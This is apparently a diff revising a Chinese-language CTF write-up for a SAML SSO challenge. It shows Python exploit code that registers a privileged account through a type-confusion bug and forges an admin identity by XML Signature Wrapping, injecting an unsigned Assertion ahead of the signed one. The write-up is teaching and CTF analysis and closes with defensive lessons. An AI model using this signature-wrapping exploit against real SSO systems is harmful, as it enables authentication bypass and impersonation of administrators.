@@ -2,150 +2,104 @@
 
 ## 题目简述
 
-题目模拟 SSO：Node.js IdP 负责注册登录，Python SP 负责校验 SAML，flag 要求身份为 `admin@rois.team`。解法先利用 `parseInt(false)` 与 MySQL `TINYINT` 存储差异注册管理员，再利用 SP 的 XML Signature Wrapping 缺陷伪造第一个 Assertion。
+题目模拟一套 SAML SSO：Node.js/Express 编写的 IdP 负责注册、登录和签发 SAMLResponse，Python/Flask 编写的 SP 保存 flag，只有解析出的身份为 `admin@rois.team` 才能访问 `/admin`。完整利用链包含两个独立缺陷：先用 JavaScript、Session 与 MySQL 对 `type` 的类型解释差异注册出可使用 SAML 的 `type=0` 用户，再利用 SP 的签名验证器和身份解析器选择了不同 Assertion，实施 XML Signature Wrapping。
 
 ## 解题过程
 
-### 关键观察
+### 取得合法的 SAMLResponse
 
-题目模拟 SSO：Node.js IdP 负责注册登录，Python SP 负责校验 SAML，flag 要求身份为 `admin@rois.team`。
+IdP 只在 `parseInt(type) === 0` 时检查邀请码，随后却把未经规范化的原值直接交给数据库：
 
-### 求解步骤
-
-题目模拟了一个 SSO 认证环境，包含 Node.js 写的 IdP 和 Python 写的 SP。Flag在SP中，校验
-SAML 身份必须是 admin@rois.team
-IdP 的注册逻辑 idp-portal/src/controllers/authController.js ：
-这里用了 parseInt(type) === 0  来判断是否是管理员注册。parseInt(false) ->  NaN，NaN
-=== 0  为 false，因此发送{"type": false} 可以绕过邀请码检查。MySQL 的 TINYINT  字
-段将 false  存储为 0 ，从而注册为 Admin
-
+```javascript
 if (parseInt(type) === 0) {
     if (!invitationCode || invitationCode !== config.getInviteCode()) {
-        // ... error
+        return registrationError();
     }
 }
-req.session.userId = await User.create({ ..., type, ... });
-不过注册成功后 IdP 会直接设置 Session req.session.userType = type  (false)。 但 middl
-eware/auth.js  检查的是 req.session.userType !== 0 。所以需要重新登录一次
-然后发起 SSO，得到合法的 SAMLResponse
-在 sp-flag/saml2/validator.py ：
-验证器确保有签名并且合法，但是不校验无签名的Assertion。 解析器 sp-flag/saml2/parse
-r.py  只取第一个进行解析
-这便存在 XML Signature Wrapping 漏洞
-在合法Assertion前加入伪造Assertion即可
+
+req.session.userId = await User.create({ username, email, type });
+req.session.userType = type;
+```
+
+注册接口没有验证 `type` 的数据类型。PDF 使用 JSON 布尔值 `false`：
+
+- `parseInt(false)` 得到 `NaN`，所以严格比较 `NaN === 0` 为假，跳过邀请码检查；
+- MySQL 的 `TINYINT` 列把布尔 `false` 保存为数值 `0`，新账号因此获得 SAML 权限；
+- 注册后当前 Session 中仍是布尔 `false`，而中间件检查 `req.session.userType !== 0`，此时严格不等成立；退出并重新登录后，数据库读出的数值 `0` 才能通过检查。
+
+仓库单题 WP 还给出字符串变体：在关闭严格模式的 MySQL 中提交 `type=abc`，`parseInt("abc")` 同样是 `NaN`，写入 `TINYINT` 时则被宽松转换为 0。两种输入利用的是同一处“校验前后类型不一致”。
+
+```python
+s.post(f"{idp}/register", json={
+    "username": username,
+    "email": email,
+    "password": password,
+    "confirmPassword": password,
+    "type": False,
+    "displayName": "Hacker",
+})
+
+s.cookies.clear()
+s.post(f"{idp}/login", data={"username": username, "password": password})
+html = s.get(f"{idp}/saml/idp/Flag").text
+saml_b64 = re.search(r'name="SAMLResponse" value="([^"]+)"', html).group(1)
+```
+
+### 定位 XML Signature Wrapping 条件
+
+SP 的验证器会收集文档中所有实际存在的 Assertion 签名，只要列表非空且这些签名都合法，就返回成功；它没有要求每个 Assertion 都必须被签名：
+
+```python
 assertion_signatures = self._find_assertion_signatures()
 if not assertion_signatures:
-      return False
+    return False
 for sig_node in assertion_signatures:
     if not self._verify_signature(sig_node):
         return False
-def get_nameid(self):
-  if self.document is None:
-      return None
+```
 
-  assertions = self.document.xpath(
-      '//saml:Assertion',
-      namespaces=self.NAMESPACES
-  )
+业务解析器随后重新执行 `//saml:Assertion`，无条件从第一个 Assertion 中取 `NameID`：
 
-  if not assertions:
-      return None
+```python
+assertions = self.document.xpath('//saml:Assertion', namespaces=self.NAMESPACES)
+assertion = assertions[0]
+return assertion.xpath('.//saml:NameID', namespaces=self.NAMESPACES)[0].text
+```
 
-  assertion = assertions[0]  # 直接取第一个
-  nameid_nodes = assertion.xpath(
-      './/saml:NameID',
-      namespaces=self.NAMESPACES
-  )
+因此，“通过签名验证的节点”和“提供身份的节点”没有绑定。保留原始已签名 Assertion，再在它前面插入无签名的管理员 Assertion，就能让验证器检查后者以外的合法签名，而解析器读取前者。
 
-  if nameid_nodes:
-      return nameid_nodes[0].text
+### 包装并提交响应
 
-  return None
-import requests
+以合法 Assertion 为模板，修改三处即可：把 `NameID` 改为管理员邮箱、移除复制节点中的 `ds:Signature`、把它插到原始节点之前。PDF 脚本给复制节点设置新的唯一 ID；仓库单题 WP 选择直接删除 ID，两者都能避开重复 ID 检查，删除 ID 更简洁：
+
+```python
 import base64
-import urllib.parse
-from lxml import etree
 import copy
-import re
-import random
-import string
+from lxml import etree
 
-IDP_HOST = "<http://<idp-host>>"
-SP_HOST = "<http://<sp-host>:<port>>"
+ns = {
+    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
+    "ds": "http://www.w3.org/2000/09/xmldsig#",
+}
 
-def solve():
-    s = requests.Session()
-    # 注册登录
-    rand_suffix = ''.join(random.choices(string.ascii_lowercase +
-string.digits, k=6))
-    username = f"hacker_{rand_suffix}"
-    password = "password123"
-    email = f"hacker_{rand_suffix}@example.com"
+root = etree.fromstring(base64.b64decode(saml_b64))
+original = root.find(".//saml:Assertion", ns)
+fake = copy.deepcopy(original)
 
-    print(username, password, email)
+fake.attrib.pop("ID", None)
+fake.find(".//saml:NameID", ns).text = "admin@rois.team"
+signature = fake.find("./ds:Signature", ns)
+if signature is not None:
+    fake.remove(signature)
 
-    register_url = f"{IDP_HOST}/register"
-    reg_data = {
-        "username": username,
-        "email": email,
-        "password": password,
-        "confirmPassword": password,
-        "type": False, #
-        "displayName": "Hacker"
-    }
-    s.post(register_url, json=reg_data)
-    s.cookies.clear()
+original.getparent().insert(original.getparent().index(original), fake)
+evil_b64 = base64.b64encode(etree.tostring(root)).decode()
+```
 
-    login_url = f"{IDP_HOST}/login"
-    s.post(login_url, data={"username": username, "password": password})
-
-    # 获取合法的 SAML Response
-    sso_init_url = f"{IDP_HOST}/saml/idp/Flag"
-    res = s.get(sso_init_url)
-    saml_response_b64 = re.search(r'name="SAMLResponse" value="([^"]+)"',
-res.text).group(1)
-
-    # XML Signature Wrapping
-    xml_content = base64.b64decode(saml_response_b64).decode('utf-8')
-    root = etree.fromstring(xml_content.encode('utf-8'))
-
-### 跨页补回：SAML 包装 payload 收尾
-
-ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion', 'ds':
-'<http://www.w3.org/2000/09/xmldsig#>'}
-    original_assertion = root.find('.//saml:Assertion', ns)
-    fake_assertion = copy.deepcopy(original_assertion)
-    fake_assertion.set('ID', f'_{urllib.parse.quote(username)}_fake')
-    nameid_node = fake_assertion.find('.//saml:NameID', ns)
-    nameid_node.text = 'admin@rois.team'
-    signature_node = fake_assertion.find('.//ds:Signature', ns)
-    if signature_node is not None:
-        signature_node.getparent().remove(signature_node)
-    root.insert(1, fake_assertion)
-
-    evil_xml = etree.tostring(root, encoding='utf-8').decode('utf-8')
-    evil_saml_response = base64.b64encode(evil_xml.encode('utf-
-8')).decode('utf-8')
-
-    # 认证
-    sp_acs_url = f"{SP_HOST}/saml/acs"
-    sp_session = requests.Session()
-    res = sp_session.post(sp_acs_url, data={
-        "SAMLResponse": evil_saml_response,
-        "RelayState": "/admin"
-    }, allow_redirects=False)
-
-    redirect_url = res.headers.get('Location')
-    target_url = f"{SP_HOST}{redirect_url}" if redirect_url.startswith("/")
-else redirect_url
-    final_res = sp_session.get(target_url)
-    print(final_res.text)
-
-if __name__ == "__main__":
-    solve()
+把 `evil_b64` POST 到 SP 的 `/saml/acs`，并令 `RelayState=/admin`。SP 验证原始 Assertion 的签名后，从排在第一位的伪造 Assertion 读取 `admin@rois.team`，建立管理员 Session，再跟随重定向访问 `/admin` 即可得到 flag。
 
 ## 方法总结
 
-- 核心技巧：类型混淆注册管理员 + XML Signature Wrapping。
-- 识别信号：注册逻辑和数据库类型转换不一致，SAML 校验器与解析器选取 Assertion 的规则不同。
-- 复用要点：签名验证通过不等于业务解析对象被签名，需检查 parser 实际读取哪个节点。
+- 核心技巧：跨 JavaScript、Session、MySQL 的类型混淆，以及 SAML XML Signature Wrapping。
+- 识别信号：同一字段在校验、存储和会话中没有统一类型；签名验证器按引用 ID 找节点，业务解析器却按文档顺序取第一个节点。
+- 复用要点：验证“文档里存在合法签名”远远不够，业务使用的 Assertion 必须与成功验证的具体签名引用绑定；测试 SSO 时要分别追踪注册态、重新登录态和 SP 建立的会话。
